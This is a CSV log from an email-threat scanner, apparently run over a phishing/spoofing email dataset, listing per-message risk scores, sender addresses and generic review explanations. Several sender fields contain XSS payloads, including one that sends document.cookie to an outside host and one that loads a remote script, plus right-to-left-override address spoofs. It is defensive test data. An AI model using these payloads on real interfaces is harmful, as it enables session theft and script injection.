filename,status,ground_truth,risk_score,severity,recommended_action,anomaly_score,detection_score,attribution_country,attribution_confidence,campaign_id,healing_applied,from_addr,spf,dkim,dmarc,elapsed_ms,explanation,error,timestamp,file
9cfbd7ed1085f7ecac8c565ac8904172.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,,False,"""hello@ianbell.com""",,,,167.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.115846,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9cfbd7ed1085f7ecac8c565ac8904172.eml
1925b72d79f6d251b267fa553838d34f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.8,CAMP-91D79629,False,admin@paypal.com,,,,167.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.133353,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\1925b72d79f6d251b267fa553838d34f.eml
22973fdc3f9c497fac3f67ec115d1429.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,18.0,,False,Vernon Webb <vernon@comp-wiz.com>,,,,166.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.151782,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22973fdc3f9c497fac3f67ec115d1429.eml
ea36ec11df4be6a68e7a8fd5c1243b1f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,,False,"""Gonéri Le Bouder"", aw-conf@midamerica.com",,,,261.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.080818,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea36ec11df4be6a68e7a8fd5c1243b1f.eml
c4790e3411f8e7227b1adb33bd593be9.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-A6B39FD2,False,"""test<img _ onerror=alert  src=null/>@attack.com""",,,,175.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.191901,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4790e3411f8e7227b1adb33bd593be9.eml
ea39996a5fe96e213325850e8ce730b5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,IT Report <veysel@zentralelectric.com>,,,,192.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.193753,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea39996a5fe96e213325850e8ce730b5.eml
73d5316295f94a6cd988c7aaf482eef0.eml,ERROR,,,,,,,,,,,,,,,185.6,,HTTP_500,2026-09-22T11:31:55.203909,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\73d5316295f94a6cd988c7aaf482eef0.eml
4bac0f10f560c57810fa551e36767a9d.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.1,,False,"""service@jos-a-bank.com"" <>, test@attack.com",,,,243.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.168854,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bac0f10f560c57810fa551e36767a9d.eml
1925e41912cd87825e3896b0346b62e8.eml,ERROR,,,,,,,,,,,,,,,161.8,,HTTP_500,2026-09-22T11:31:55.253733,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\1925e41912cd87825e3896b0346b62e8.eml
229ed86ec41a5d3881a39a5cdeb49bb5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,21.4,CAMP-FEA5915B,False,test@attack.com,,,,152.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.283250,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\229ed86ec41a5d3881a39a5cdeb49bb5.eml
4bc157a9a6c5632f309fdcf8d177b4af.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-B1927367,False,hartsoe@enron.com}attack.com,,,,152.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.300407,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bc157a9a6c5632f309fdcf8d177b4af.eml
c47961c31c07f195869e3bb6d19b07bb.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,21.8,,False,continental_airlines_inc_050801@airmail.continental.com,,,,153.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.318116,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c47961c31c07f195869e3bb6d19b07bb.eml
9d012635bbfa1fc7dcec6b8c6f9b0091.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,21.9,CAMP-1B512D52,False,robert.fuller@enron.com,,,,267.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.225129,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d012635bbfa1fc7dcec6b8c6f9b0091.eml
73df3c31fead942281c6fd219fa893de.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.4,CAMP-A0DF5E35,False,trevor.mihalik@enron.com,,,,157.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.367487,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\73df3c31fead942281c6fd219fa893de.eml
9d01c42cdf0002d4a915ac993826ea14.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.9,CAMP-07DD176B,False,squatteredcondiments@ocasiao.pt}attack.com,,,,158.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.386445,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d01c42cdf0002d4a915ac993826ea14.eml
192717274b9b2a5fd20e6f3178cc25c2.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,lend <NASA@pacevideo.com>,,,,173.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.389606,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\192717274b9b2a5fd20e6f3178cc25c2.eml
ea3cc86dfe2a1be2f3a4a484b199b652.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,21.3,,False,fschoenhof@banamex.com,,,,236.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.342578,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea3cc86dfe2a1be2f3a4a484b199b652.eml
4bc23403534fbd613d46ce9d03b188fd.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.3,,False,"""\\u202su_be12148f0000-93d9-110d-ace7-090a917e_21891_0@\\u202moc.tfosorcim.srettelswen""",,,,185.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.415639,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bc23403534fbd613d46ce9d03b188fd.eml
c4852da6b2d3cef7950305d13a80c4c8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-E59407A1,False,Aegis Capital Group <Frances5225@walla.com>,,,,184.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.435476,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4852da6b2d3cef7950305d13a80c4c8.eml
ea3fc53f154c4ebfab079594a00fc796.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,18.0,CAMP-DF791A3B,False,gerry.willis@enron.com,,,,184.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.453204,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea3fc53f154c4ebfab079594a00fc796.eml
73e7790000a6e57d65fe74db5213cfe8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-C943D9FA,False,Byron Gunn <support13211@angeleyez-lookingglass.com>,,,,184.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.472028,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\73e7790000a6e57d65fe74db5213cfe8.eml
22a20b47c6fb131de16cf2a26a736ff9.eml,ERROR,,,,,,,,,,,,,,,245.6,,HTTP_500,2026-09-22T11:31:55.412851,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22a20b47c6fb131de16cf2a26a736ff9.eml
192b982d5778111e15a5988265626f28.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.8,,False,Karina <yvbhm@ulyssesonline.com>,,,,156.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.524765,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\192b982d5778111e15a5988265626f28.eml
22ab85f61a3f848e455d7017d491115c.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Davison Inventions <davison.inventions@lynwoodlarezonline.net>,,,,156.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.545133,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22ab85f61a3f848e455d7017d491115c.eml
4bc4044274af21e036a51cb830f3b719.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.0,CAMP-1F429E65,False,lang1@lhom.com,,,,164.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.563422,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bc4044274af21e036a51cb830f3b719.eml
9d05ae87d795de98e65091818cd5050f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-308E987D,False,Brice Henry <icwskilx@bleedinvain.com>,,,,275.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.492498,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d05ae87d795de98e65091818cd5050f.eml
ea425db188b0d9ed497321e5d7e3133b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Jon Kyle <mikeotss@fashion-times.com>,,,,188.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.600665,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea425db188b0d9ed497321e5d7e3133b.eml
73e9f09518335db1e1c2e90a0b5003d1.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-509702DA,False,"""b64 b64""@attack.com",,,,192.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.619864,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\73e9f09518335db1e1c2e90a0b5003d1.eml
9d104abdf25d4f2fe2b7668e82015040.eml,ERROR,,,,,,,,,,,,,,,178.2,,HTTP_500,2026-09-22T11:31:55.638057,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d104abdf25d4f2fe2b7668e82015040.eml
1931be6df99f7530d4c48680cbe33f81.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-C8085CCF,False,"""b64 b64""@attack.com",,,,181.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.656353,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\1931be6df99f7530d4c48680cbe33f81.eml
c48b3f585ac3d7086a907aaa2f1ac2c6.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-DC95301E,False,test@attack.com,,,,289.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.579064,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c48b3f585ac3d7086a907aaa2f1ac2c6.eml
4bccc2a7183d796cc23b3ffe2e9e2174.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,McAfee Red <impact@compudyn.com>,,,,211.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.681101,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bccc2a7183d796cc23b3ffe2e9e2174.eml
c493bd797186c3b339d451b3d834cdef.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.2,CAMP-87341E34,False,Ella Mcguire <inforunnerm@inforunner.de>,,,,211.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.701932,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c493bd797186c3b339d451b3d834cdef.eml
ea4286fa934fc3fa2e08017c6f70c19f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-95ABC26A,False,claire.dunnett@enron.com,,,,205.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.727708,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea4286fa934fc3fa2e08017c6f70c19f.eml
22ad920a884a2096a35cc2578f027334.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,,False,tom@mantires.com,,,,292.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.658496,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22ad920a884a2096a35cc2578f027334.eml
9d1059a5de3542210f81e406fdfb39a1.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,CAMP-E5925925,False,"<>, atencion@mail.com",,,,182.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.789378,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d1059a5de3542210f81e406fdfb39a1.eml
1931e77df025030c08142853e0673700.eml,ERROR,,,,,,,,,,,,,,,161.9,,HTTP_500,2026-09-22T11:31:55.812493,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\1931e77df025030c08142853e0673700.eml
22af2eed147a4ddcc0775d833754d5d6.eml,ERROR,,,,,,,,,,,,,,,160.5,,HTTP_500,2026-09-22T11:31:55.816370,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22af2eed147a4ddcc0775d833754d5d6.eml
4bde62116959a975a36e8ec9dba4a7cb.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,22.1,CAMP-71D6F9CC,False,paul_puchot@enron.net}attack.com,,,,155.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.838133,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bde62116959a975a36e8ec9dba4a7cb.eml
73f33562fd1428c37bd2e123d3790b18.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,23.0,CAMP-0E3C5A38,False,service@paypal.com,,,,243.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.767727,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\73f33562fd1428c37bd2e123d3790b18.eml
ea59c4528a400abc8777b02236fb2f78.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,15.1,CAMP-AB651F8C,False,admin@security.hotmail.com,,,,140.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.892782,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea59c4528a400abc8777b02236fb2f78.eml
73ffd3e0ee7f96db700799bfe7e03fb9.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-FAAB8D87,False,"""test<svg onload='img=new Image();img.src=//x55.me/geo.php?get=+document.cookie;'>@attack.com""",,,,139.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.913691,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\73ffd3e0ee7f96db700799bfe7e03fb9.eml
9d2eff754c26bbbdd7fb55767aed22e5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.3,CAMP-40451A2E,False,tyrus@onebox.com,,,,141.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.933146,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d2eff754c26bbbdd7fb55767aed22e5.eml
c498d987d9c016203a50be181f7ee3d5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,fangf@wharton.upenn.edu,,,,228.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.868528,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c498d987d9c016203a50be181f7ee3d5.eml
1933a6c7e32ad21af05273d9a5dcd5a3.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,CAMP-6A65AB5C,False,kzy4@msn.com,,,,147.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.972363,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\1933a6c7e32ad21af05273d9a5dcd5a3.eml
4be65258dcd268654a007364a48e7c8c.eml,OK,,37.0,MEDIUM,REVIEW,0.1,55,,19.3,CAMP-8BDCF368,False,scott.sitter@enron.com,,,,174.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.974470,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4be65258dcd268654a007364a48e7c8c.eml
c4ade019b7ab56cbe3df15ee1ae07fd1.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,23.0,CAMP-07754125,False,carnes@fas.harvard.edu,,,,192.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.976967,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4ade019b7ab56cbe3df15ee1ae07fd1.eml
ea6152e2e1c59e8b9a9bc74b45af42f7.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,19.3,CAMP-3BC80F4E,False,jonathan@test.gersten.com,,,,201.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.993148,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea6152e2e1c59e8b9a9bc74b45af42f7.eml
22c1dc9f3b03ae6bca2cf069f5803a8b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-DC5ECCF5,False,"""test<xmp><IMG src='test.gif&</xmp><IMG onerror=alert(document.cookie) src='><IMG src='><IMG src='test.gif&>@attack.com""",,,,261.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:55.950506,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22c1dc9f3b03ae6bca2cf069f5803a8b.eml
9d3feb3905c617af6f7edacbc2d6341e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.5,CAMP-DD4CF610,False,terri.walker@enron.com,,,,201.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.033605,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d3feb3905c617af6f7edacbc2d6341e.eml
22c1e4f6a2d72aeb4f43e357f430ffdc.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.3,CAMP-350C2109,False,randa.karkour@compaq.com,,,,205.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.053524,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22c1e4f6a2d72aeb4f43e357f430ffdc.eml
19402ee49ad3fe9e00c7d240a9684f0f.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,18.4,CAMP-2A631CD9,False,admin@security.paypal.com,,,,205.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.074989,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\19402ee49ad3fe9e00c7d240a9684f0f.eml
740b39cd4249a49e6db947edab896963.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Hilary Boyle <dwdeyincm@deyinc.com>,,,,286.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.011157,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\740b39cd4249a49e6db947edab896963.eml
c4b8649a4c65a6947e7be84051ef5744.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,18.7,CAMP-C3A3085B,False,admin@security.swbell.net,,,,206.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.119521,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4b8649a4c65a6947e7be84051ef5744.eml
ea750c3f09a3b99d593b9b81d2da9bf7.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-616CF2F4,False,"""Pride C. Guajardo"" <02180711@hanmail.net>",,,,194.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.148915,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\ea750c3f09a3b99d593b9b81d2da9bf7.eml
740eed663a52265527a1315708e47ef5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,"""fxwen@bechtel.com""",,,,198.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.169661,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\740eed663a52265527a1315708e47ef5.eml
9d3ffa84ce7437c8c7e67d8627d1b1e4.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-241E4C01,False,"""test<xmp><IMG src='test.gif&</xmp><IMG onerror=alert(document.cookie) src='><IMG src='><IMG src='test.gif&>@attack.com""",,,,196.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.194565,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\9d3ffa84ce7437c8c7e67d8627d1b1e4.eml
4beca8de908312b6b8b3aa71b4dcc604.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.4,CAMP-7E53ACE0,False,jeff@cleandrive.net,,,,313.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.096650,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4beca8de908312b6b8b3aa71b4dcc604.eml
19491ed5605078603d1ad1f5c4916090.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.4,CAMP-1306C4B8,False,"""\\u202gdohde@\\u202moc.loa""",,,,192.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.235510,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\19491ed5605078603d1ad1f5c4916090.eml
4bf2395e4038df7751b872b98ff6a623.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,19.2,,False,detlef.steuer@hsu-hamburg.de}attack.com,,,,187.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.258937,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\4bf2395e4038df7751b872b98ff6a623.eml
c4c4753b926ce08e3aac07b292d20ee5.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-74ACF48F,False,"""test</script><script/src=//yoursitejs.com></script>@attack.com""",,,,183.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.280675,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\c4c4753b926ce08e3aac07b292d20ee5.eml
22d05a72e30f584eefa9c022d3045015.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Christy English <emcreplica@finesexpix.com>,,,,271.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:56.212432,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\22d05a72e30f584eefa9c022d3045015.eml
